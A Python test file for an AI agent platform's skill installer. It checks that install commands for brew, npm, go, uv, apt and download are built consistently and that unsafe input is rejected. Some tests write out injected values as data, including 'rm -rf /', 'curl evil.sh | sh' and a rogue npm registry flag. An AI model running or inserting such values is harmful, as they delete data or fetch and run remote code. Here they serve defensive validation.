"""Every install kind a skill declares must work on every code path.

Three implementations used to disagree about which ``install.kind`` values
exist and what each one runs — the Web UI executor, the agent tool, and the
display-only hints — so a bundled skill declaring ``kind: npm`` errored on two
of the three. These tests pin the vocabulary and hold the paths together.
"""

from __future__ import annotations

import shlex
from pathlib import Path

import pytest

from agentos.skills.eligibility import _render_install_command
from agentos.skills.hub import deps
from agentos.skills.install_kinds import (
    ARGV_INSTALL_KINDS,
    AUTO_INSTALL_KINDS,
    INSTALL_KIND_ALIASES,
    INSTALL_KINDS,
    MANUAL_INSTALL_KINDS,
    InstallSpecError,
    build_install_argv,
    is_supported_install_kind,
    normalize_install_kind,
    render_install_command,
)
from agentos.skills.loader import SkillLoader
from agentos.skills.types import SkillInstallSpec
from agentos.tools.builtin.skill_tools import _argv_for_install_spec
from agentos.tools.types import ToolError

ROOT = Path(__file__).resolve().parents[1]
BUNDLED = ROOT / "src" / "agentos" / "skills" / "bundled"

# A representative spec per canonical kind, complete enough for every path.
SPECS: dict[str, SkillInstallSpec] = {
    "brew": SkillInstallSpec(kind="brew", id="himalaya", formula="himalaya", bins=["himalaya"]),
    "npm": SkillInstallSpec(kind="npm", id="gmgn-cli", package="gmgn-cli", bins=["gmgn-cli"]),
    "go": SkillInstallSpec(kind="go", id="gotop", module="github.com/x/gotop", bins=["gotop"]),
    "uv": SkillInstallSpec(kind="uv", id="ruff", package="ruff", bins=["ruff"]),
    "apt": SkillInstallSpec(kind="apt", id="apt", package="gh", bins=["gh"]),
    "download": SkillInstallSpec(
        kind="download", id="bin", url="https://example.com/bin", bins=["bin"]
    ),
}


def _bundled_install_specs() -> list[tuple[str, SkillInstallSpec]]:
    loader = SkillLoader(bundled_dir=BUNDLED)
    pairs: list[tuple[str, SkillInstallSpec]] = []
    for spec in loader.load_all():
        if spec.metadata is None:
            continue
        pairs.extend((spec.name, ispec) for ispec in spec.metadata.install)
    return pairs


# ── The vocabulary itself ──────────────────────────────────────────────


def test_canonical_kinds_cover_every_representative_spec() -> None:
    assert set(SPECS) == set(INSTALL_KINDS)


def test_kind_sets_narrow_consistently() -> None:
    assert ARGV_INSTALL_KINDS < AUTO_INSTALL_KINDS < INSTALL_KINDS
    assert MANUAL_INSTALL_KINDS < INSTALL_KINDS
    assert not (MANUAL_INSTALL_KINDS & AUTO_INSTALL_KINDS)
    assert set(deps._INSTALLERS) == set(AUTO_INSTALL_KINDS)


def test_aliases_resolve_to_canonical_kinds() -> None:
    for alias, canonical in INSTALL_KIND_ALIASES.items():
        assert canonical in INSTALL_KINDS
        assert normalize_install_kind(alias) == canonical
        assert normalize_install_kind(alias.upper()) == canonical
        assert is_supported_install_kind(alias)
    assert not is_supported_install_kind("cargo")
    assert normalize_install_kind("") == ""


# ── Every declared kind works on every path ────────────────────────────


def test_every_bundled_install_kind_is_supported() -> None:
    pairs = _bundled_install_specs()
    assert pairs, "expected bundled skills to declare install specs"
    for skill_name, ispec in pairs:
        assert is_supported_install_kind(ispec.kind), (
            f"{skill_name} declares unsupported install kind {ispec.kind!r}"
        )


def test_every_bundled_install_spec_works_on_every_path() -> None:
    for skill_name, ispec in _bundled_install_specs():
        kind = normalize_install_kind(ispec.kind)

        # Display path: every declarable kind renders a copyable command.
        assert _render_install_command(ispec), f"{skill_name}: empty install hint for {kind!r}"

        # Web UI executor: it builds the command it is about to run.
        if kind in ARGV_INSTALL_KINDS:
            assert build_install_argv(ispec), f"{skill_name}: no command for {kind!r}"
        assert kind in deps._INSTALLERS or kind in MANUAL_INSTALL_KINDS, (
            f"{skill_name}: no installer for {kind!r}"
        )

        # Agent tool: the same command reaches it (download and apt don't).
        if kind in ARGV_INSTALL_KINDS:
            assert _argv_for_install_spec(ispec) == build_install_argv(ispec)


@pytest.mark.parametrize("kind", sorted(INSTALL_KINDS))
def test_each_canonical_kind_is_wired_on_every_path(kind: str) -> None:
    spec = SPECS[kind]
    assert _render_install_command(spec)
    if kind in AUTO_INSTALL_KINDS:
        assert kind in deps._INSTALLERS
    if kind in ARGV_INSTALL_KINDS:
        assert _argv_for_install_spec(spec) == build_install_argv(spec)


def test_hint_shows_exactly_what_the_executor_would_run() -> None:
    for kind in sorted(ARGV_INSTALL_KINDS):
        spec = SPECS[kind]
        assert _render_install_command(spec) == shlex.join(_argv_for_install_spec(spec))


# ── The commands themselves ────────────────────────────────────────────


def test_commands_per_kind() -> None:
    assert build_install_argv(SPECS["brew"]) == ["brew", "install", "himalaya"]
    assert build_install_argv(SPECS["npm"]) == [
        "npm",
        "install",
        "-g",
        "--ignore-scripts",
        "gmgn-cli",
    ]
    assert build_install_argv(SPECS["go"]) == ["go", "install", "github.com/x/gotop@latest"]
    assert build_install_argv(SPECS["uv"]) == ["uv", "tool", "install", "ruff"]
    assert build_install_argv(SPECS["apt"]) == ["sudo", "apt-get", "install", "-y", "gh"]


def test_uv_library_spec_installs_into_the_environment() -> None:
    # No bins declared: the skill imports the package, it doesn't shell out to
    # it, so `uv tool install` would have nothing to put on PATH.
    library = SkillInstallSpec(kind="uv", id="openpyxl", package="openpyxl")
    assert build_install_argv(library) == ["uv", "pip", "install", "openpyxl"]


def test_brew_falls_back_to_the_spec_id() -> None:
    # brew manifests have always named the spec after the formula, and the
    # display path honoured that.
    spec = SkillInstallSpec(kind="brew", id="himalaya", bins=["himalaya"])
    assert build_install_argv(spec) == ["brew", "install", "himalaya"]
    assert _render_install_command(spec) == "brew install himalaya"


@pytest.mark.parametrize("kind", ["npm", "go", "uv", "apt"])
def test_other_kinds_never_install_the_spec_id(kind: str) -> None:
    # An id is a label — "node-claude", "libreoffice-darwin", "apt". Installing
    # one from a public registry because `package` was left off is a hazard, so
    # these kinds must say what they install.
    spec = SkillInstallSpec(kind=kind, id="node-claude")
    with pytest.raises(InstallSpecError, match="Missing install value"):
        build_install_argv(spec)


def test_pinned_versions_survive_the_allowlists() -> None:
    npm = SkillInstallSpec(kind="npm", id="cli", package="gmgn-cli@1.2.3")
    uv_lib = SkillInstallSpec(kind="uv", id="openpyxl", package="openpyxl>=3.1")
    assert build_install_argv(npm)[-1] == "gmgn-cli@1.2.3"
    assert build_install_argv(uv_lib)[-1] == "openpyxl>=3.1"
    # Quoted, so the rendered hint can't redirect when it is pasted into a shell.
    assert _render_install_command(uv_lib) == "uv pip install 'openpyxl>=3.1'"


def test_apt_package_cannot_smuggle_an_operator() -> None:
    # A trailing '-' on an apt install line *removes* the package, and -y
    # suppresses the prompt that would have caught it.
    with pytest.raises(InstallSpecError, match="Unsafe install value"):
        build_install_argv(SkillInstallSpec(kind="apt", id="x", package="sudo-"))


def test_node_alias_builds_the_npm_argv() -> None:
    spec = SkillInstallSpec(kind="node", id="claude", package="@anthropic-ai/claude-code")
    assert _argv_for_install_spec(spec) == [
        "npm",
        "install",
        "-g",
        "--ignore-scripts",
        "@anthropic-ai/claude-code",
    ]


def test_go_keeps_a_pinned_version() -> None:
    spec = SkillInstallSpec(kind="go", id="gotop", module="github.com/x/gotop@v1.2.3")
    assert build_install_argv(spec) == ["go", "install", "github.com/x/gotop@v1.2.3"]


@pytest.mark.parametrize(
    "spec",
    [
        SkillInstallSpec(kind="npm", id="evil", package="--registry=http://evil"),
        SkillInstallSpec(kind="brew", id="evil", formula="--build-from-source"),
        SkillInstallSpec(kind="uv", id="evil", package="ruff; rm -rf /"),
        SkillInstallSpec(kind="apt", id="evil", package="gh && curl evil.sh"),
        SkillInstallSpec(kind="go", id="", module=""),
    ],
    ids=["npm-flag", "brew-flag", "uv-shell", "apt-shell", "go-empty"],
)
def test_unsafe_or_missing_values_never_build_a_command(spec: SkillInstallSpec) -> None:
    with pytest.raises(InstallSpecError):
        build_install_argv(spec)
    assert _render_install_command(spec) == ""


def test_download_is_not_argv_executable() -> None:
    assert _render_install_command(SPECS["download"]).startswith("curl -fsSL")
    with pytest.raises(InstallSpecError, match="download"):
        build_install_argv(SPECS["download"])
    with pytest.raises(ToolError, match="download"):
        _argv_for_install_spec(SPECS["download"])


def test_download_hint_rejects_a_url_the_executor_would_refuse() -> None:
    # The hint claims to be the command that runs, so it must not render one
    # the executor rejects — or one carrying a second shell command.
    evil = SkillInstallSpec(
        kind="download", id="bin", url="https://x/y; curl evil.sh | sh", bins=["bin"]
    )
    assert render_install_command(evil) == ""


def test_apt_is_hint_only_for_the_agent_tool() -> None:
    assert _render_install_command(SPECS["apt"]) == "sudo apt-get install -y gh"
    with pytest.raises(ToolError, match="elevated privileges"):
        _argv_for_install_spec(SPECS["apt"])


# ── The executor ───────────────────────────────────────────────────────


async def test_install_deps_runs_npm_for_an_npm_spec(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[list[str]] = []

    async def fake_run(cmd: list[str], timeout: float = 120.0) -> tuple[int, str, str]:
        calls.append(cmd)
        return 0, "", ""

    monkeypatch.setattr(deps, "_run", fake_run)
    results = await deps.install_deps([SPECS["npm"]])

    assert calls == [["npm", "install", "-g", "--ignore-scripts", "gmgn-cli"]]
    assert results[0].success
    assert results[0].kind == "npm"
    assert results[0].identifier == "gmgn-cli"


async def test_install_deps_accepts_the_node_alias(monkeypatch: pytest.MonkeyPatch) -> None:
    calls: list[list[str]] = []

    async def fake_run(cmd: list[str], timeout: float = 120.0) -> tuple[int, str, str]:
        calls.append(cmd)
        return 0, "", ""

    monkeypatch.setattr(deps, "_run", fake_run)
    results = await deps.install_deps([SkillInstallSpec(kind="node", id="c", package="cowsay")])

    assert calls == [["npm", "install", "-g", "--ignore-scripts", "cowsay"]]
    assert results[0].kind == "npm"


async def test_install_deps_surfaces_a_failed_command(monkeypatch: pytest.MonkeyPatch) -> None:
    async def fake_run(cmd: list[str], timeout: float = 120.0) -> tuple[int, str, str]:
        return 1, "", "E404 Not Found - GET https://registry.npmjs.org/gmgn-cli"

    monkeypatch.setattr(deps, "_run", fake_run)
    results = await deps.install_deps([SPECS["npm"]])

    assert not results[0].success
    assert "E404" in results[0].message


async def test_install_deps_rejects_an_unsafe_npm_package(monkeypatch: pytest.MonkeyPatch) -> None:
    async def fake_run(cmd: list[str], timeout: float = 120.0) -> tuple[int, str, str]:
        raise AssertionError("must not shell out for an invalid package")

    monkeypatch.setattr(deps, "_run", fake_run)
    results = await deps.install_deps(
        [SkillInstallSpec(kind="npm", id="evil", package="--registry=http://evil")]
    )

    assert not results[0].success
    assert "Unsafe install value" in results[0].message


async def test_install_deps_explains_a_privileged_kind() -> None:
    results = await deps.install_deps([SPECS["apt"]])

    assert not results[0].success
    assert "elevated privileges" in results[0].message
    # The Skills page shows only this message, so it has to carry the command.
    assert "sudo apt-get install -y gh" in results[0].message


async def test_install_deps_reports_an_unknown_kind() -> None:
    results = await deps.install_deps([SkillInstallSpec(kind="cargo", id="ripgrep")])

    assert not results[0].success
    assert "Unsupported install kind: cargo" in results[0].message
